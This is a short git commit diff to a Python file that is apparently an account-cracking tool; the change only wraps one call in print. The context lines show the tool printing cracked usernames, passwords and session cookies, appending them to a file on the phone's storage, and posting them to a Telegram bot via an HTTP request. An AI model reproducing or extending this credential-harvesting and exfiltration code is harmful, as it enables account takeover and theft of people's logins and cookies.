2d105c8cd8e409958abdf12dbc8b08113f4afa06
tessterr <168154763+tessterr@users.noreply.github.com>
2024-06-30 12:30:50 +0530

    Update test1.py

--- test1.py
+++ test1.py
@@ -1245,7 +1245,7 @@ def m4(idf,pwv):
     if 'Photoshop' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
-            cek_apk(session, coki)
+            print(cek_apk(session, coki))
             open('/sdcard/ATOM-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             statusok = (f" {user} | {ps} | {coki} ")
             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
